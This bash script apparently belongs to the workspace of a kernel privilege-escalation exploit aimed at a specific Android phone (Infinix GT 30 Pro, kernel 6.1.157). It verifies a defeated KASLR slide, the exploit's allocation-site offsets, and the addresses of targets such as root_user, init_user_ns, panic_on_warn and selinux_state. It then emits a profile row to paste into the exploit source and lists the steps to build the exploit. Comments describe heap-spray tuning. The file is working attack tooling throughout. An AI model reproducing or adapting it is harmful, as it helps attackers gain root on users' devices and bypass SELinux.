#!/usr/bin/env bash
# verify-derive-v4.sh — offline verifier for a derive-consts.sh v4/v4.1 console
# (Infinix GT 30 Pro / X6873, Shark CVE-2026-98260 port).
#
# v4.1 (2026-11-14): prediction semantics corrected after the lifted
# kallsyms (bundle #4) + the 19:58-capture re-read. The 19:58 "139 timer
# allocs from 15 pids" were 320B filp events at __alloc_file+0x2c (linked
# 0x39feb0) — the GhostLock file-spray funnel, NOT posix timers. The old
# PRED_TIMER_OFF 0x39feb0 and the L_t-L_c=0x2F3D68 invariant both describe
# that filp funnel and are RETIRED as timer facts. The true posix_timers
# alloc site sits inside do_timer_create (sibling ports: +0x94..0xb8):
# D2 is now a do_timer_create-window check, D3/D4 guard against the filp
# misattribution, D11 is informational only, and the H4 ladder runs on the
# CONSOLE timer-site low21 (not the retired bake).
#
# Purpose: the moment the on-device derive-consts.sh v4 console arrives,
# run it through this tool to (a) parse every constant mechanically,
# (b) check each value against the Task-6 cross-boot predictions,
# (c) check internal self-consistency (slide, port frame, paste block),
# and (d) optionally re-derive everything from the kept kallsyms copy.
#
# Usage:
#   verify-derive-v4.sh <console.txt> [kallsyms-copy]
#   verify-derive-v4.sh --help
#
# Exit codes: 0 = VERIFIED · 2 = INCOMPLETE (usable subset, gaps listed)
#             1 = FAILED (at least one hard check violated)
#
# This runs on the analysis side (bash, 64-bit ints). The int32 quirks of
# the on-device mksh are handled by treating the printed slide as a signed
# int32 representative of its mod-2^32 class (see SLIDE_U).

set -u

# ------------------------------------------------------------------ consts
RELEASE_EXPECTED="6.1.157-android14-11-ga8b0b542991e-ab15601211"
PRED_D_TIMER=$((0x193258))     # do_timer_create linked (run #2, boot-invariant;
                               # kallsyms-confirmed 2026-11-14)
# RETIRED v4.1: PRED_TIMER_OFF 0x39feb0 was the FILP funnel (__alloc_file+0x2c),
# not a timer site. Timer identity is now the do_timer_create window (D2):
DTC_WINDOW=$((1536))           # do_timer_create [start, start+0x600)
PRED_COPY_OFF=$((0xac148))     # copy call site,  combo b=0 (k=0) — CONFIRMED
                               # (trace x2 boots + kallsyms enclosing)
PRED_LT_LC=$((0x2F3D68))       # RETIRED as a timer invariant: this is the
                               # GhostLock FILP-funnel delta (informational only)
BAKE_TIMER_LOW21=$((0x19feb0))
BAKE_COPY_LOW21=$((0xac148))
TRAP_TIMER_OFF=$((0x19feb0))   # the k=0 candidate that killed derive v3
PREFILL_SELINUX=0xffffffc08225b827
BASE_LO=$((0x80000000))
PORT_HI=$((0xffffffc0))   # NOTE: must stay arithmetic — bash test -eq rejects hex literals
FRAME_LIMIT=$((0x40000000))    # linked offsets live in [0, 1 GiB)
TEXT_DEF_LO=$((0x10000)); TEXT_DEF_HI=$((0x1500000))
SLAB_TIMER=$((0x108)); SLAB_CRED=$((0xb0)); SLAB_TASK=$((0x12c0))
M2=$((0x200000))               # 2 MiB

usage() {
    sed -n '2,15p' "$0" | sed 's/^# \{0,1\}//'
    exit 0
}
[ "${1:-}" = "--help" ] && usage
[ $# -ge 1 ] && [ -f "$1" ] || { echo "usage: verify-derive-v4.sh <console.txt> [kallsyms-copy]"; exit 2; }
CONSOLE="$1"; KSYMS="${2:-}"

PASS=0; FAIL=0; WARN=0; SKIP=0; FAILED_IDS=""; INCOMPLETE_REASON=""
ok()   { PASS=$((PASS+1)); printf 'CHECK %-6s PASS  %s\n' "$1" "$2"; }
bad()  { FAIL=$((FAIL+1)); FAILED_IDS="$FAILED_IDS $1"; printf 'CHECK %-6s FAIL  %s\n' "$1" "$2"; }
warn() { WARN=$((WARN+1)); printf 'CHECK %-6s WARN  %s\n' "$1" "$2"; }
skip() { SKIP=$((SKIP+1)); printf 'CHECK %-6s SKIP  %s\n' "$1" "$2"; }
note() { printf 'NOTE         %s\n' "$1"; }

# --------------------------------------------------------------- helpers
# port-frame hexaddr (0xffffffc0_8xxxxxxx) -> linked offset, or "" if bad
addr_to_off() {
    local a="$1" hi lo off
    case "$a" in 0x*) a="${a#0x}" ;; *) return 1 ;; esac
    [ ${#a} -eq 16 ] || return 1
    case "$a" in fffffff0*|ffffffc0*) ;; *) return 1 ;; esac
    hi=$((0x${a:0:8})); lo=$((0x${a:8:8}))
    [ "$hi" -eq "$PORT_HI" ] || return 1
    off=$(( (lo - BASE_LO) % 0x100000000 ))
    [ "$off" -lt 0 ] && off=$(( off + 0x100000000 ))
    [ "$off" -lt "$FRAME_LIMIT" ] || return 1
    echo "$off"
}
# linked offset -> port-frame hexaddr
off_to_addr() { printf '0x%x%08x' "$PORT_HI" $(( BASE_LO + $1 )); }
hx() { printf '0x%x' "$(( $1 ))"; }

# ------------------------------------------------------------------ parse
rel=$(grep -m1 -E '^\[ok\] release matched: ' "$CONSOLE" | sed 's/.*matched: //')
slide_s=$(grep -m1 -E '^\[ok\] KASLR slide pinned from 3 anchors' "$CONSOLE" | grep -oE -- '-?[0-9]+$')
tw=$(grep -m1 -E '^\[ok\] text window: ' "$CONSOLE" | sed 's/.*window: //')
dtc_addr=$(grep -m1 -E '^\[ok\] do_timer_create : ' "$CONSOLE" | grep -oE '0x[0-9a-f]+')
dcp_addr=$(grep -m1 -E '^\[ok\] dup_task_struct : ' "$CONSOLE" | grep -oE '0x[0-9a-f]+')
sym_val() { grep -m1 -E "^$1[[:space:]]*: 0x[0-9a-f]+$" "$CONSOLE" | grep -oE '0x[0-9a-f]+$' || echo ""; }
pow_addr=$(sym_val panic_on_warn); ru_addr=$(sym_val root_user)
iun_addr=$(sym_val init_user_ns); iuc_addr=$(sym_val init_ucounts); igr_addr=$(sym_val init_groups)
sel_line=$(grep -m1 -E '^\[info\] selinux_state symbol ' "$CONSOLE" || true)
sel_addr=""; sel_delta=""
if [ -n "$sel_line" ]; then
    sel_addr=$(printf '%s\n' "$sel_line" | grep -oE '0x[0-9a-f]+' | head -1)
    sel_delta=$(printf '%s\n' "$sel_line" | grep -oE 'delta [+-]0x[0-9a-f]+' | grep -oE '[+-]0x[0-9a-f]+')
fi
slab=$(grep -m1 -E '^\[ok\] slab sizes: ' "$CONSOLE" | sed 's/.*sizes: //')
ts_line=$(grep -m1 -E '^\[ok\] timer site : ' "$CONSOLE" || true)
cs_line=$(grep -m1 -E '^\[ok\] copy site  : ' "$CONSOLE" || true)
aborted=$(grep -c 'DERIVATION ABORTED' "$CONSOLE")
kept=$(grep -m1 -E '^\[done\] workdir KEPT for inspection: ' "$CONSOLE" | sed 's/.*inspection: //;s/ (.*//')
lacks=$(grep -m1 -E '^\[warn\] kallsyms lacks data symbols:' "$CONSOLE" | sed 's/.*symbols://;s/ - they.*//')

# paste block (profile row): the 9 value lines between the two banners
pb_release=""; pb_timer_site=""; pb_timer_low21=""; pb_copy_low21=""
pb_selinux=""; pb_pow=""; pb_ru=""; pb_iun=""; pb_iuc=""; pb_igr=""
pb_start=$(grep -n 'paste into exploit/src/K61157_plant.c' "$CONSOLE" | head -1 | cut -d: -f1)
pb_end=$(grep -n 'paste into plant_core.inc' "$CONSOLE" | head -1 | cut -d: -f1)
if [ -n "$pb_start" ] && [ -n "$pb_end" ] && [ "$pb_end" -gt "$pb_start" ]; then
    pb=$(sed -n "${pb_start},${pb_end}p" "$CONSOLE")
    pb_release=$(printf '%s\n' "$pb" | grep -m1 -oE '"[^"]+"' | tr -d '"')
    pb_timer_site=$(printf '%s\n' "$pb" | grep -m1 'timer_site ' | grep -oE '0x[0-9a-f]+ULL' | head -1 | sed 's/ULL//')
    pb_timer_low21=$(printf '%s\n' "$pb" | grep -m1 'timer_low21' | grep -oE '0x[0-9a-f]+ULL' | head -1 | sed 's/ULL//')
    pb_copy_low21=$(printf '%s\n' "$pb" | grep -m1 'copy_low21' | grep -oE '0x[0-9a-f]+ULL' | head -1 | sed 's/ULL//')
    pb_selinux=$(printf '%s\n' "$pb" | grep -m1 'selinux_state' | grep -oE '0x[0-9a-f]+ULL' | head -1 | sed 's/ULL//')
    for tag_var in 'panic_on_warn pb_pow' 'root_user pb_ru' 'init_user_ns pb_iun' 'init_ucounts pb_iuc' 'init_groups pb_igr'; do
        tag=${tag_var%% *}; var=${tag_var##* }
        val=$(printf '%s\n' "$pb" | grep -m1 "/\* $tag " | grep -oE '0x[0-9a-f]+ULL' | head -1 | sed 's/ULL//')
        eval "$var=\$val"
    done
fi

parse_site() { # $1=line var name -> prints "addr|low21|enc|src"
    local ln; eval "ln=\$$1"
    [ -n "$ln" ] || { echo ""; return; }
    # v4.1: "matches bundle" is optional (the timer low21 bake is retired;
    # the copy line still carries it)
    printf '%s\n' "$ln" | grep -oE '0x[0-9a-f]+ \(low21 0x[0-9a-f]+( matches bundle)?; enclosing [^;]+; source (trace|family)\)$' \
        | sed 's/ (low21 /|/; s/ matches bundle; enclosing /|/; s/; enclosing /|/; s/; source /|/; s/)$//' || echo ""
}
ts_parse=$(parse_site ts_line); cs_parse=$(parse_site cs_line)
ts_addr=""; ts_low21=""; ts_enc=""; ts_src=""
[ -n "$ts_parse" ] && { ts_addr=$(echo "$ts_parse" | cut -d'|' -f1); ts_low21=$(echo "$ts_parse" | cut -d'|' -f2); ts_enc=$(echo "$ts_parse" | cut -d'|' -f3); ts_src=$(echo "$ts_parse" | cut -d'|' -f4); }
cs_addr=""; cs_low21=""; cs_enc=""; cs_src=""
[ -n "$cs_parse" ] && { cs_addr=$(echo "$cs_parse" | cut -d'|' -f1); cs_low21=$(echo "$cs_parse" | cut -d'|' -f2); cs_enc=$(echo "$cs_parse" | cut -d'|' -f3); cs_src=$(echo "$cs_parse" | cut -d'|' -f4); }

echo "===================================================================="
echo " verify-derive-v4 — $(basename "$CONSOLE")"
echo "===================================================================="
[ -n "$rel" ] && note "release     : $rel"
[ -n "$slide_s" ] && note "slide (s32) : $slide_s"
[ -n "$ts_addr" ] && note "timer site  : $ts_addr (enc ${ts_enc:-?}, src ${ts_src:-?})"
[ -n "$cs_addr" ] && note "copy site   : $cs_addr (enc ${cs_enc:-?}, src ${cs_src:-?})"
[ "$aborted" -gt 0 ] && note "console carries a DERIVATION ABORTED marker"
[ -n "$kept" ] && note "workdir kept: $kept (ask for the kallsyms copy too)"
[ -n "$lacks" ] && note "kallsyms lacked:$lacks"
echo "--------------------------------------------------------------------"

# ----------------------------------------------------------- A. release
if [ -z "$rel" ]; then
    bad A1 "release line missing (early abort before slide pinning?)"
    INCOMPLETE_REASON="no release line"
elif [ "$rel" = "$RELEASE_EXPECTED" ]; then ok A1 "release matches $RELEASE_EXPECTED"
else bad A1 "release '$rel' != expected '$RELEASE_EXPECTED'"; fi

# ------------------------------------------------------------- B. slide
SLIDE_U=""
if [ -z "$slide_s" ]; then
    bad B1 "slide line missing"; INCOMPLETE_REASON="${INCOMPLETE_REASON:+$INCOMPLETE_REASON; }no slide"
else
    SLIDE_U=$(( slide_s % 0x100000000 )); [ "$SLIDE_U" -lt 0 ] && SLIDE_U=$(( SLIDE_U + 0x100000000 ))
    ok B1 "slide parsed: signed $slide_s = unsigned $(hx $SLIDE_U)"
    if [ $(( SLIDE_U % M2 )) -eq 0 ]; then ok B2 "slide 2MiB-aligned"
    else warn B2 "slide not 2MiB-aligned (arm64 KASLR normally is)"; fi
fi

# ------------------------------------------ C. port-frame address checks
frame_check() { # $1=id $2=addr $3=label -> sets FC_OFF (empty if none)
    # runs in the MAIN shell (no command substitution): ok/bad/skip counters
    # must survive into the verdict, and the offset rides the FC_OFF global
    FC_OFF=""
    if [ -n "$2" ] && [ "$2" != "0x0" ]; then
        FC_OFF=$(addr_to_off "$2" 2>/dev/null) || FC_OFF=""
        if [ -n "$FC_OFF" ]; then ok "$1" "$3 $(off_to_addr "$FC_OFF") = linked $(hx "$FC_OFF")"
        else bad "$1" "$3 '$2' is not a valid port-frame address"; fi
    else
        skip "$1" "$3 missing"
    fi
}
frame_check C1 "$dtc_addr" "do_timer_create "; D_TIMER=$FC_OFF
frame_check C2 "$dcp_addr" "dup_task_struct"; D_COPY=$FC_OFF
frame_check C3 "$pow_addr" "panic_on_warn "; OFF_POW=$FC_OFF
frame_check C4 "$ru_addr"  "root_user     "; OFF_RU=$FC_OFF
frame_check C5 "$iun_addr" "init_user_ns  "; OFF_IUN=$FC_OFF
frame_check C6 "$iuc_addr" "init_ucounts  "; OFF_IUC=$FC_OFF
frame_check C7 "$igr_addr" "init_groups   "; OFF_IGR=$FC_OFF
frame_check C8 "$ts_addr" "timer site   "; OFF_TS=$FC_OFF
frame_check C9 "$cs_addr" "copy site    "; OFF_CS=$FC_OFF

# ------------------------------------------------- D. prediction checks
[ -n "$D_TIMER" ] && { [ "$D_TIMER" -eq "$PRED_D_TIMER" ] \
    && ok D1 "do_timer_create $(hx $D_TIMER) == run#2 measured $(hx $PRED_D_TIMER)" \
    || bad D1 "do_timer_create $(hx $D_TIMER) != run#2 measured $(hx $PRED_D_TIMER)"; }

if [ -n "$OFF_TS" ]; then
    # v4.1: the timer site must sit inside do_timer_create — the low21 bake
    # (0x19feb0) and the 0x39feb0 prediction both belong to the filp funnel
    if [ -n "$D_TIMER" ]; then
        if [ "$OFF_TS" -ge "$D_TIMER" ] && [ "$OFF_TS" -lt $(( D_TIMER + DTC_WINDOW )) ]; then
            ok D2 "timer site $(hx $OFF_TS) inside do_timer_create (+$(hx $(( OFF_TS - D_TIMER ))))"
        else
            bad D2 "timer site $(hx $OFF_TS) OUTSIDE do_timer_create [$(hx $D_TIMER), $(hx $(( D_TIMER + DTC_WINDOW )))) — filp-funnel misattribution?"
        fi
    else skip D2 "do_timer_create not in console — window check unavailable"; fi
    [ "$OFF_TS" -ne "$TRAP_TIMER_OFF" ] && ok D3 "timer site is NOT the filp-funnel low21 grid 0x19feb0 (v4.1: old 'k=0 trap' = __alloc_file funnel low21)" \
        || bad D3 "timer site IS 0x19feb0 — the FILP funnel low21 (__alloc_file+0x2c at k=1); misattributed filp events, not posix timers"
    [ $(( OFF_TS & 0x1fffff )) -ne "$BAKE_TIMER_LOW21" ] && ok D4 "timer low21 $(hx $(( OFF_TS & 0x1fffff ))) != retired filp bake 0x19feb0" \
        || bad D4 "timer low21 equals the retired filp bake 0x19feb0 — filp misattribution"
    case "$ts_enc" in
        *timer_create*|*posix_timer*|*alloc_posix*) ok D5 "timer enclosing '$ts_enc' matches the family" ;;
        "") skip D5 "no timer enclosing printed" ;;
        *) bad D5 "timer enclosing '$ts_enc' matches NO family glob" ;;
    esac
    [ "$ts_src" = "trace" ] && ok D6 "timer site source: trace (primary)" \
        || { [ "$ts_src" = "family" ] && warn D6 "timer site source: family fallback (trace window empty)"; }
else INCOMPLETE_REASON="${INCOMPLETE_REASON:+$INCOMPLETE_REASON; }timer site unresolved"; fi

if [ -n "$OFF_CS" ]; then
    [ "$OFF_CS" -eq "$PRED_COPY_OFF" ] && ok D7 "copy site == predicted 0xac148 (combo b=0)" \
        || bad D7 "copy site $(hx $OFF_CS) != predicted $(hx $PRED_COPY_OFF)"
    [ $(( OFF_CS & 0x1fffff )) -eq "$BAKE_COPY_LOW21" ] && ok D8 "copy low21 == bundle 0xac148" \
        || bad D8 "copy low21 $(hx $(( OFF_CS & 0x1fffff ))) != bundle $(hx $BAKE_COPY_LOW21)"
    case "$cs_enc" in
        *dup_task*|*copy_process*|*alloc_task*|*task_struct*) ok D9 "copy enclosing '$cs_enc' matches the family" ;;
        "") skip D9 "no copy enclosing printed" ;;
        *) bad D9 "copy enclosing '$cs_enc' matches NO family glob" ;;
    esac
    [ "$cs_src" = "trace" ] && ok D10 "copy site source: trace (primary)" \
        || { [ "$cs_src" = "family" ] && warn D10 "copy site source: family fallback"; }
else INCOMPLETE_REASON="${INCOMPLETE_REASON:+$INCOMPLETE_REASON; }copy site unresolved"; fi

if [ -n "$OFF_TS" ] && [ -n "$OFF_CS" ]; then
    d=$(( (OFF_TS - OFF_CS) % 0x100000000 )); [ "$d" -lt 0 ] && d=$(( d + 0x100000000 ))
    if [ "$d" -eq "$PRED_LT_LC" ]; then
        warn D11 "L_t - L_c = 0x2F3D68 — that is the GHOSTLOCK filp-funnel delta, NOT a timer invariant (v4.1: informational)"
    else
        ok D11 "L_t - L_c = $(hx $d) (the 0x2F3D68 filp-funnel invariant is no longer asserted — v4.1)"
    fi
fi

# ------------------------------------------------- E. data symbol checks
missing_syms=""
for pair in "panic_on_warn $OFF_POW" "root_user $OFF_RU" "init_user_ns $OFF_IUN" "init_ucounts $OFF_IUC" "init_groups $OFF_IGR"; do
    s=${pair%% *}; v=${pair##* }
    [ -n "$v" ] && [ "$v" -ne 0 ] || missing_syms="$missing_syms $s"
done
if [ -z "$missing_syms" ]; then
    ok E1 "all five data symbols non-zero (pending guard will clear)"
    uniq=$(for v in "$OFF_POW" "$OFF_RU" "$OFF_IUN" "$OFF_IUC" "$OFF_IGR"; do echo "$v"; done | sort -u | wc -l)
    [ "$uniq" -eq 5 ] && ok E2 "five distinct data-symbol addresses" || bad E2 "data symbols not all distinct"
    oor=""
    for v in "$OFF_POW" "$OFF_RU" "$OFF_IUN" "$OFF_IUC" "$OFF_IGR"; do
        [ "$v" -lt $((0x40000)) ] || [ "$v" -ge $((0x4000000)) ] && oor="$oor $(hx $v)"
    done
    [ -z "$oor" ] || warn E3 "data symbols outside the plausible image window:$oor"
else
    warn E1 "zero/missing data symbols:$missing_syms — paste block would NOT clear the guard (gap, not contradiction)"
    INCOMPLETE_REASON="${INCOMPLETE_REASON:+$INCOMPLETE_REASON; }pending:$missing_syms"
fi

if [ -n "$sel_delta" ]; then
    sd=$(( sel_delta ))
    [ "$sd" -le 256 ] && [ "$sd" -ge -256 ] && ok E4 "selinux delta $sel_delta within ±0x100" \
        || warn E4 "selinux delta $sel_delta large — double-check the prefilled constant"
elif [ -n "$sel_addr" ]; then
    warn E4 "selinux_state symbol present but delta unparsable"
else
    warn E4 "selinux_state not in kallsyms — cross-check skipped (prefilled constant stands)"
fi

# ------------------------------------------------------- F. paste block
if [ -n "$pb_release" ]; then
    ok F1 "paste block present"
    [ "$pb_release" = "$RELEASE_EXPECTED" ] && ok F2 "block release string matches" || bad F2 "block release '$pb_release' mismatch"
    [ "$pb_selinux" = "$PREFILL_SELINUX" ] && ok F3 "block selinux_state == prefilled 0xffffffc08225b827" || bad F3 "block selinux_state '$pb_selinux' != prefilled"
    blk_vs_line() { # $1=id $2=block val $3=parsed [ok]/early val $4=label
        if [ -z "$3" ]; then skip "$1" "$4: no console line to compare"
        elif [ "$2" = "$3" ]; then ok "$1" "block $4 == console value"
        else bad "$1" "block $4 '$2' != console '$3'"; fi
    }
    ts_lo21_exp=""; [ -n "$OFF_TS" ] && ts_lo21_exp=$(printf '0x%x' $(( OFF_TS & 0x1fffff )))
    cs_lo21_exp=""; [ -n "$OFF_CS" ] && cs_lo21_exp=$(printf '0x%x' $(( OFF_CS & 0x1fffff )))
    blk_vs_line F4 "$pb_timer_site" "$ts_addr" "timer_site"
    blk_vs_line F5 "$pb_timer_low21" "$ts_lo21_exp" "timer_low21"
    blk_vs_line F6 "$pb_copy_low21" "$cs_lo21_exp" "copy_low21"
    blk_vs_line F7 "$pb_pow" "$pow_addr" "panic_on_warn"
    blk_vs_line F8 "$pb_ru" "$ru_addr" "root_user"
    blk_vs_line F9 "$pb_iun" "$iun_addr" "init_user_ns"
    blk_vs_line F10 "$pb_iuc" "$iuc_addr" "init_ucounts"
    blk_vs_line F11 "$pb_igr" "$igr_addr" "init_groups"
    fzero=0
    for f in "$pb_timer_site" "$pb_pow" "$pb_ru" "$pb_iun" "$pb_iuc" "$pb_igr"; do
        if [ -z "$f" ] || [ "$f" = "0x0" ]; then warn F12 "block field empty/zero: $f"; fzero=1; fi
    done
    if [ "$fzero" = "0" ]; then ok F12 "every block field non-zero"
    else INCOMPLETE_REASON="${INCOMPLETE_REASON:+$INCOMPLETE_REASON; }zero block fields"; fi
else
    [ -z "$INCOMPLETE_REASON" ] && INCOMPLETE_REASON="no paste block"
    skip F1 "no paste block in the console (aborted before site resolution?)"
fi

# ------------------------------------------------------------ G. slab
if [ -n "$slab" ]; then
    st=$(echo "$slab" | grep -oE 'posix_timers_cache=[0-9]+' | cut -d= -f2)
    sc=$(echo "$slab" | grep -oE 'cred_jar=[0-9]+' | cut -d= -f2)
    sk=$(echo "$slab" | grep -oE 'task_struct=[0-9]+' | cut -d= -f2)
    [ "$st" = "$SLAB_TIMER" ] || warn G1 "posix_timers_cache objsize $st != 0x108 (bundle req)"
    [ "$sc" = "$SLAB_CRED" ] || warn G1 "cred_jar objsize $sc != 0xb0 (bundle req)"
    [ "$sk" = "$SLAB_TASK" ] || warn G1 "task_struct objsize $sk != 0x12c0 (bundle req)"
    [ "$st" = "$SLAB_TIMER" ] && [ "$sc" = "$SLAB_CRED" ] && [ "$sk" = "$SLAB_TASK" ] \
        && ok G1 "slab objsizes match the bundle (264/176/4800)"
else skip G1 "no slab sizes line"; fi

# --------------------------------------------- H. kallsyms re-derivation
if [ -n "$KSYMS" ] && [ -f "$KSYMS" ]; then
    [ -n "$SLIDE_U" ] || skip H1 "no slide in console — cannot re-derive"
    if [ -n "$SLIDE_U" ]; then
        echo "--------------------------------------------------------------------"
        note "kallsyms re-derivation from $(basename "$KSYMS")"
        # helper: symbol -> linked offset using the CONSOLE slide (empty if absent)
        koff() {
            local ln rt v
            ln=$(grep -m1 -E "^[0-9a-f]{16} [a-zA-Z] $1\$" "$KSYMS" 2>/dev/null) || return 1
            rt=$((0x$(echo "$ln" | cut -d' ' -f1 | tail -c 9)))
            v=$(( (rt - SLIDE_U - BASE_LO) % 0x100000000 ))
            [ "$v" -lt 0 ] && v=$(( v + 0x100000000 ))
            [ "$v" -lt "$FRAME_LIMIT" ] || return 1
            echo "$v"
        }
        # helper: symbol -> its INDEPENDENT anchor slide (runtime - base - image offset)
        aslide() {
            local ln rt
            ln=$(grep -m1 -E "^[0-9a-f]{16} [a-zA-Z] $1\$" "$KSYMS" 2>/dev/null) || return 1
            rt=$((0x$(echo "$ln" | cut -d' ' -f1 | tail -c 9)))
            v=$(( (rt - BASE_LO - $2) % 0x100000000 ))
            [ "$v" -lt 0 ] && v=$(( v + 0x100000000 ))
            echo "$v"
        }
        s1=$(aslide init_task $((0x201f640))); s2=$(aslide init_cred $((0x2031aa8))); s3=$(aslide root_task_group $((0x2209980)))
        if [ -n "$s1" ] && [ -n "$s2" ] && [ -n "$s3" ]; then
            if [ "$s1" = "$s2" ] && [ "$s2" = "$s3" ]; then
                ok H1 "three anchors agree on slide $(hx $s1)"
                [ "$s1" -eq "$SLIDE_U" ] && ok H2 "kallsyms slide == console slide" \
                    || bad H2 "kallsyms slide $(hx $s1) != console slide $(hx $SLIDE_U)"
            else bad H1 "anchors disagree: $(hx $s1) / $(hx $s2) / $(hx $s3)"; fi
        else bad H1 "anchor symbol(s) missing from kallsyms (init_task/init_cred/root_task_group)"; fi
        for pair in "do_timer_create $D_TIMER C1" "dup_task_struct $D_COPY C2" "panic_on_warn $OFF_POW C3" \
                    "root_user $OFF_RU C4" "init_user_ns $OFF_IUN C5" "init_ucounts $OFF_IUC C6" "init_groups $OFF_IGR C7"; do
            set -- $pair; kv=$(koff "$1")
            if [ -z "$kv" ]; then skip "H3" "$1 not in kallsyms"
            elif [ -z "$2" ]; then note "$1 recoverable from kallsyms: $(off_to_addr "$kv") (console had none)"
            elif [ "$kv" -eq "$2" ]; then ok H3 "$1 kallsyms == console ($(hx $kv))"
            else bad H3 "$1 kallsyms $(hx $kv) != console $(hx $2)"; fi
        done
        # candidate uniqueness ladder for both sites
        if [ -n "$tw" ]; then
            TLO=$(addr_to_off "$(echo "$tw" | awk '{print $1}')"); THI=$(addr_to_off "$(echo "$tw" | awk '{print $3}')")
        else TLO=$TEXT_DEF_LO; THI=$TEXT_DEF_HI; fi
        [ -n "$TLO" ] && [ -n "$THI" ] || { TLO=$TEXT_DEF_LO; THI=$TEXT_DEF_HI; }
        ladder() { # $1=low21 $2=family regex $3=label -> prints candidates + "LADDER cnt uniq name"
            awk -v lo21="$1" -v tlo="$TLO" -v thi="$THI" -v fam="$2" -v m2="$M2" -v slide="$SLIDE_U" -v blo="$BASE_LO" '
                function h2d(h,  i, c, v) {
                    v = 0
                    for (i = 1; i <= length(h); i++) {
                        c = substr(h, i, 1)
                        v = v * 16 + (index("0123456789abcdef", c) - 1)
                    }
                    return v
                }
                BEGIN { n = 0 }
                /^[0-9a-f]{16} [tT] / {
                    rt = h2d(substr($1, 9, 8))
                    v = (rt - slide - blo) % 4294967296; if (v < 0) v += 4294967296
                    if (v < tlo || v >= thi) next
                    n++; addr[n] = v; name[n] = $3
                }
                END {
                    cnt = 0; uniq = ""; umatch = ""
                    for (k = 0; k <= 40; k++) {
                        c = lo21 + k * m2
                        if (c < tlo || c >= thi) continue
                        enc = "(no text symbol below)"
                        for (i = n; i >= 1; i--) if (addr[i] <= c) { enc = name[i]; break }
                        if (enc ~ fam) { cnt++; uniq = c; umatch = enc }
                        if (c == lo21) printf "  cand k=0  0x%x enclosing %s\n", c, enc
                        else if (cnt == 0 || c == uniq) printf "  cand k=%d 0x%x enclosing %s\n", k, c, enc
                    }
                    printf "LADDER %d %d %s\n", cnt, uniq, umatch
                }' "$KSYMS"
        }
        if [ -n "$OFF_TS" ]; then
            ts_lo21=$(( OFF_TS & 0x1fffff ))
            echo "  -- timer candidates (console site low21 $(hx $ts_lo21)) --"
            lad_t=$(ladder $ts_lo21 'timer_create|posix_timer|alloc_posix' timer)
            echo "$lad_t" | grep -E '^  cand' | sed 's/^/ /'
            t_cnt=$(echo "$lad_t" | grep -oE '^LADDER [0-9]+' | grep -oE '[0-9]+')
            t_uniq=$(echo "$lad_t" | grep -oE '^LADDER [0-9]+ [0-9]+' | awk '{print $3}')
            if [ "$t_cnt" = "1" ]; then
                [ "$t_uniq" -eq "$OFF_TS" ] && ok H4 "timer ladder on console low21: unique family candidate == console site $(hx $OFF_TS)" \
                    || bad H4 "timer ladder unique candidate $(hx $t_uniq) != console site $(hx $OFF_TS)"
            elif [ -z "$t_cnt" ] || [ "$t_cnt" = "0" ]; then
                bad H4 "console timer-site grid has NO family candidate inside the text window — enclosing mismatch?"
            else
                bad H4 "timer ladder: $t_cnt family candidates — ambiguous"
            fi
        else
            echo "  -- timer candidates (no console site — ladder skipped) --"
            skip H4 "no console timer site — ladder not applicable (v4.1)"
        fi
        echo "  -- copy candidates (low21 $(hx $BAKE_COPY_LOW21)) --"
        lad_c=$(ladder $BAKE_COPY_LOW21 'dup_task|copy_process|alloc_task|task_struct' copy)
        echo "$lad_c" | grep -E '^  cand' | sed 's/^/ /'
        c_cnt=$(echo "$lad_c" | grep -oE '^LADDER [0-9]+' | grep -oE '[0-9]+')
        c_uniq=$(echo "$lad_c" | grep -oE '^LADDER [0-9]+ [0-9]+' | awk '{print $3}')
        if [ "$c_cnt" = "1" ]; then
            [ "$c_uniq" -eq "$PRED_COPY_OFF" ] && ok H5 "copy ladder: unique family candidate == predicted $(hx $PRED_COPY_OFF)" \
                || bad H5 "copy ladder unique candidate $(hx $c_uniq) != predicted $(hx $PRED_COPY_OFF)"
        elif [ -z "$c_cnt" ] || [ "$c_cnt" = "0" ]; then
            bad H5 "copy ladder: no family candidate inside the text window"
        else
            bad H5 "copy ladder: $c_cnt family candidates — ambiguous"
        fi
        # (v4.1: the old k=0-trap note is gone - the ladder now runs on the
        # console site's own grid, so its k=0 is the console site itself)
    fi
elif [ -n "$KSYMS" ]; then
    warn H0 "kallsyms argument '$KSYMS' is not a readable file"
fi

# ------------------------------------------------------------- verdict
echo "===================================================================="
if [ $FAIL -gt 0 ]; then
    VERDICT=FAILED
elif [ -n "$INCOMPLETE_REASON" ]; then
    VERDICT=INCOMPLETE
else
    VERDICT=VERIFIED
fi
echo "VERDICT: $VERDICT   (pass=$PASS fail=$FAIL warn=$WARN skip=$SKIP)"
[ $FAIL -gt 0 ] && echo "failed checks:$FAILED_IDS"
if [ "$VERDICT" = "INCOMPLETE" ]; then
    echo "gaps: $INCOMPLETE_REASON"
    echo "usable subset: slide/do_timer_create/data symbols are valid regardless (early block)."
    [ -n "$kept" ] && echo "workdir kept at: $kept — send the kallsyms copy for full offline resolution."
fi
if [ "$VERDICT" = "VERIFIED" ]; then
    echo ""
    echo "---- canonical profile row for exploit/src/K61157_plant.c ----"
    echo "    {"
    echo "        \"$RELEASE_EXPECTED\","
    echo "        $(off_to_addr $OFF_TS)ULL,  /* timer_site  */"
    echo "        $(printf '0x%x' $(( OFF_TS & 0x1fffff )))ULL,  /* timer_low21 */"
    echo "        $(printf '0x%x' $(( OFF_CS & 0x1fffff )))ULL,  /* copy_low21  */"
    echo "        $PREFILL_SELINUX, /* selinux_state */"
    echo "        $(off_to_addr $OFF_POW)ULL,  /* panic_on_warn */"
    echo "        $(off_to_addr $OFF_RU)ULL,  /* root_user     */"
    echo "        $(off_to_addr $OFF_IUN)ULL, /* init_user_ns  */"
    echo "        $(off_to_addr $OFF_IUC)ULL, /* init_ucounts  */"
    echo "        $(off_to_addr $OFF_IGR)ULL, /* init_groups   */"
    echo "    },"
    echo ""
    echo "next: paste the row -> gcc -fsyntax-only exploit/src/K61157_plant.c"
    echo "      -> ./exploit/build-all.sh (NDK) -> app must no longer print PORT_61157_PENDING"
fi
case "$VERDICT" in
    VERIFIED) exit 0 ;;
    INCOMPLETE) exit 2 ;;
    *) exit 1 ;;
esac
